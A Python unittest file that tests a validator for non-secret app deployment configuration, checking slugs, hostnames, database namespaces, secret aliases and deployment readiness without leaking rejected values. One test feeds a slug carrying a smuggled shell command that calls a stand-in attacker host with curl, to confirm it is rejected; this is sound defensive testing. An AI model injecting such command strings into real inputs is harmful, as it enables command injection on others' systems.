#!/usr/bin/env python3
"""Focused tests for APP-001 non-secret app configuration validation."""

from __future__ import annotations

import copy
import importlib.util
import io
import json
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]


def _load_validator():
    import sys

    path = REPO_ROOT / "scripts" / "validate-app-config.py"
    spec = importlib.util.spec_from_file_location("validate_app_config", path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"unable to load validator from {path}")
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


vac = _load_validator()


def _good_config() -> dict:
    return {
        "schemaVersion": 1,
        "app": {"slug": "agent-arena"},
        "repository": {"owner": "example-owner", "name": "agent-arena"},
        "hostname": "arena.example.com",
        "database": {
            "mode": "existing-project-shared",
            "namespace": "agent_arena",
        },
        "deployment": {
            "identity": "agent-arena",
            "stateKey": "agent-arena",
        },
        "dns": {"choice": "cloudflare"},
        "secretAliases": {
            "CLOUDFLARE_API_TOKEN": "CLOUDFLARE_API_TOKEN",
            "VERCEL_API_TOKEN": "VERCEL_API_TOKEN",
            "SUPABASE_URL": "SUPABASE_URL",
            "SUPABASE_ANON_KEY": "SUPABASE_ANON_KEY",
            "SUPABASE_SERVICE_ROLE_KEY": "SUPABASE_SERVICE_ROLE_KEY",
            "SUPABASE_ACCESS_TOKEN": "SUPABASE_ACCESS_TOKEN",
            "TERRAFORM_STATE_PASSWORD": "TERRAFORM_STATE_PASSWORD",
        },
        "localConflictInventory": {
            "slugs": ["savedtube"],
            "namespaces": ["savedtube"],
            "hostnames": ["savedtube.example.com"],
            "deploymentIdentities": ["savedtube"],
            "stateKeys": ["savedtube"],
        },
        "externalVerification": {
            "accountPermissions": "unverified",
            "sharedDatabaseGuard": "unverified",
            "secretSource": "unverified",
            "liveConflictDiscovery": "pending",
        },
    }


class ConfigValidationTests(unittest.TestCase):
    def test_schema_file_is_valid_draft202012(self):
        schema_path = REPO_ROOT / "app.config.schema.json"
        self.assertTrue(schema_path.is_file(), "app.config.schema.json must exist")
        schema = json.loads(schema_path.read_text(encoding="utf-8"))
        vac.validate_schema_document(schema)

    def test_example_config_passes_draft_validation(self):
        example_path = REPO_ROOT / "examples" / "app.config.example.json"
        self.assertTrue(example_path.is_file())
        config = json.loads(example_path.read_text(encoding="utf-8"))
        result = vac.validate_config(config, mode="draft")
        self.assertTrue(result.ok, result.errors)
        self.assertIn("example-owner", json.dumps(config))
        self.assertIn("example.com", json.dumps(config))

    def test_good_config_passes_draft(self):
        result = vac.validate_config(_good_config(), mode="draft")
        self.assertTrue(result.ok, result.errors)

    def test_missing_required_fields_fail(self):
        config = _good_config()
        del config["hostname"]
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)
        self.assertTrue(any("hostname" in e.lower() for e in result.errors))

    def test_unknown_fields_rejected(self):
        config = _good_config()
        config["extraThing"] = "nope"
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)
        self.assertTrue(
            any("additional" in e.lower() or "unknown" in e.lower() for e in result.errors)
        )

    def test_unsafe_slug_rejected(self):
        config = _good_config()
        config["app"]["slug"] = "Agent_Arena"
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)

    def test_reserved_namespace_rejected(self):
        config = _good_config()
        config["database"]["namespace"] = "public"
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)
        self.assertTrue(any("reserved" in e.lower() for e in result.errors))

    def test_shared_namespace_rejected(self):
        config = _good_config()
        config["database"]["namespace"] = "shared"
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)

    def test_wildcard_hostname_rejected(self):
        config = _good_config()
        config["hostname"] = "*.example.com"
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)

    def test_url_hostname_rejected(self):
        config = _good_config()
        config["hostname"] = "https://arena.example.com"
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)

    def test_path_hostname_rejected(self):
        config = _good_config()
        config["hostname"] = "arena.example.com/app"
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)

    def test_conflicting_local_inventory_rejected(self):
        config = _good_config()
        config["localConflictInventory"]["slugs"].append("agent-arena")
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)
        self.assertTrue(any("conflict" in e.lower() for e in result.errors))

    def test_duplicate_identifiers_across_fields_rejected(self):
        config = _good_config()
        config["database"]["namespace"] = "agent_arena"
        config["app"]["slug"] = "other-app"
        config["deployment"]["identity"] = "other-app"
        config["deployment"]["stateKey"] = "other-app"
        config["localConflictInventory"]["namespaces"].append("agent_arena")
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)

    def test_secret_aliases_must_be_uppercase_names_not_credentials(self):
        config = _good_config()
        config["secretAliases"]["CLOUDFLARE_API_TOKEN"] = "cf_live_secret_value_here"
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)
        joined = " ".join(result.errors).lower()
        self.assertNotIn("cf_live_secret_value_here", joined)
        self.assertTrue(any("alias" in e.lower() for e in result.errors))

    def test_lowercase_alias_key_rejected(self):
        config = _good_config()
        config["secretAliases"] = {"cloudflare_api_token": "CLOUDFLARE_API_TOKEN"}
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)

    def test_shell_metacharacters_fail_without_echoing_value(self):
        config = _good_config()
        dangerous = "agent-arena; curl http://evil.example"
        config["app"]["slug"] = dangerous
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)
        joined = " ".join(result.errors)
        self.assertNotIn(dangerous, joined)
        self.assertNotIn("curl http://evil.example", joined)

    def test_embedded_credential_pattern_fails_without_echoing(self):
        config = _good_config()
        cred = "https://user:p@ssw0rd@example.com"
        config["hostname"] = cred
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)
        joined = " ".join(result.errors)
        self.assertNotIn("p@ssw0rd", joined)
        self.assertNotIn(cred, joined)

    def test_unresolved_dns_ok_for_draft_fails_deployment_ready(self):
        config = _good_config()
        config["dns"]["choice"] = "unresolved"
        draft = vac.validate_config(config, mode="draft")
        self.assertTrue(draft.ok, draft.errors)
        ready = vac.validate_config(config, mode="deployment-ready")
        self.assertFalse(ready.ok)
        self.assertTrue(
            any("dns" in e.lower() and "unresolved" in e.lower() for e in ready.errors)
        )

    def test_missing_external_verification_blocks_deployment_ready(self):
        config = _good_config()
        ready = vac.validate_config(config, mode="deployment-ready")
        self.assertFalse(ready.ok)
        self.assertTrue(
            any(
                "external" in e.lower()
                or "unverified" in e.lower()
                or "pending" in e.lower()
                for e in ready.errors
            )
        )

    def test_deployment_ready_requires_verified_preflight(self):
        config = _good_config()
        config["dns"]["choice"] = "cloudflare"
        config["externalVerification"] = {
            "accountPermissions": "verified",
            "sharedDatabaseGuard": "verified",
            "secretSource": "verified",
            "liveConflictDiscovery": "complete",
        }
        result = vac.validate_config(config, mode="deployment-ready")
        self.assertTrue(result.ok, result.errors)

    def test_shared_database_mode_required(self):
        config = _good_config()
        config["database"]["mode"] = "create-new-project"
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)

    def test_cli_validates_file(self):
        config = _good_config()
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "app.config.json"
            path.write_text(json.dumps(config), encoding="utf-8")
            code = vac.main(["--config", str(path), "--mode", "draft"])
            self.assertEqual(code, 0)

    def test_cli_rejects_bad_file(self):
        config = _good_config()
        del config["app"]
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "app.config.json"
            path.write_text(json.dumps(config), encoding="utf-8")
            code = vac.main(["--config", str(path), "--mode", "draft"])
            self.assertNotEqual(code, 0)

    def test_reference_example_matches_schema_closed_fields(self):
        example = json.loads(
            (REPO_ROOT / "examples" / "app.config.example.json").read_text(encoding="utf-8")
        )
        schema = json.loads(
            (REPO_ROOT / "app.config.schema.json").read_text(encoding="utf-8")
        )
        bad = copy.deepcopy(example)
        bad["dns"]["unexpected"] = True
        result = vac.validate_config(bad, mode="draft", schema=schema)
        self.assertFalse(result.ok)

    def test_malformed_root_null_does_not_crash(self):
        result = vac.validate_config(None, mode="draft")
        self.assertFalse(result.ok)
        self.assertTrue(any("type" in e.lower() or "object" in e.lower() for e in result.errors))

    def test_malformed_root_list_does_not_crash(self):
        result = vac.validate_config(["not", "an", "object"], mode="draft")
        self.assertFalse(result.ok)

    def test_malformed_root_scalar_does_not_crash(self):
        result = vac.validate_config("scalar-config", mode="draft")
        self.assertFalse(result.ok)
        joined = " ".join(result.errors)
        self.assertNotIn("scalar-config", joined)

    def test_malformed_nested_database_type_does_not_crash(self):
        config = _good_config()
        config["database"] = "not-an-object"
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)
        joined = " ".join(result.errors)
        self.assertNotIn("not-an-object", joined)
        self.assertTrue(any("database" in e for e in result.errors))

    def test_malformed_nested_app_and_dns_types_do_not_crash(self):
        config = _good_config()
        config["app"] = ["bad"]
        config["dns"] = 42
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)
        joined = " ".join(result.errors)
        self.assertNotIn("42", joined)

    def test_secret_like_unknown_property_name_not_leaked(self):
        secret_name = "AWS_SECRET_ACCESS_KEY_live_leak"
        config = _good_config()
        config[secret_name] = "should-not-appear"
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)
        joined = " ".join(result.errors)
        self.assertNotIn(secret_name, joined)
        self.assertNotIn("should-not-appear", joined)
        self.assertTrue(any("unknown field" in e.lower() for e in result.errors))

    def test_nested_unknown_property_name_not_leaked(self):
        secret_name = "api_token_exfiltratable"
        config = _good_config()
        config["dns"][secret_name] = "x"
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)
        joined = " ".join(result.errors)
        self.assertNotIn(secret_name, joined)

    def test_control_characters_fail_without_echoing(self):
        config = _good_config()
        nasty = "agent\x00arena\x1f"
        config["app"]["slug"] = nasty
        result = vac.validate_config(config, mode="draft")
        self.assertFalse(result.ok)
        joined = " ".join(result.errors)
        self.assertNotIn("\x00", joined)
        self.assertNotIn(nasty, joined)

    def test_missing_schema_file_clean_failure(self):
        config = _good_config()
        with tempfile.TemporaryDirectory() as tmp:
            missing = Path(tmp) / "no-such-schema.json"
            result = vac.validate_config(config, mode="draft", schema_path=missing)
            self.assertFalse(result.ok)
            self.assertTrue(any("schema" in e.lower() for e in result.errors))
            err = io.StringIO()
            out = io.StringIO()
            cfg_path = Path(tmp) / "app.config.json"
            cfg_path.write_text(json.dumps(config), encoding="utf-8")
            with redirect_stdout(out), redirect_stderr(err):
                code = vac.main(
                    ["--config", str(cfg_path), "--schema", str(missing), "--mode", "draft"]
                )
            self.assertNotEqual(code, 0)
            combined = out.getvalue() + err.getvalue()
            self.assertNotIn("Traceback", combined)
            self.assertNotIn(str(missing), combined)

    def test_invalid_schema_json_clean_failure(self):
        config = _good_config()
        with tempfile.TemporaryDirectory() as tmp:
            bad_schema = Path(tmp) / "bad.schema.json"
            bad_schema.write_text("{not-json", encoding="utf-8")
            result = vac.validate_config(config, mode="draft", schema_path=bad_schema)
            self.assertFalse(result.ok)
            self.assertTrue(any("schema" in e.lower() for e in result.errors))
            err = io.StringIO()
            out = io.StringIO()
            cfg_path = Path(tmp) / "app.config.json"
            cfg_path.write_text(json.dumps(config), encoding="utf-8")
            with redirect_stdout(out), redirect_stderr(err):
                code = vac.main(
                    [
                        "--config",
                        str(cfg_path),
                        "--schema",
                        str(bad_schema),
                        "--mode",
                        "draft",
                    ]
                )
            self.assertNotEqual(code, 0)
            combined = out.getvalue() + err.getvalue()
            self.assertNotIn("Traceback", combined)
            self.assertNotIn("{not-json", combined)

    def test_cli_malformed_root_no_traceback_or_value_leak(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "app.config.json"
            path.write_text('["leaky-root-value"]', encoding="utf-8")
            err = io.StringIO()
            out = io.StringIO()
            with redirect_stdout(out), redirect_stderr(err):
                code = vac.main(["--config", str(path), "--mode", "draft"])
            self.assertNotEqual(code, 0)
            combined = out.getvalue() + err.getvalue()
            self.assertNotIn("Traceback", combined)
            self.assertNotIn("leaky-root-value", combined)


if __name__ == "__main__":
    unittest.main()
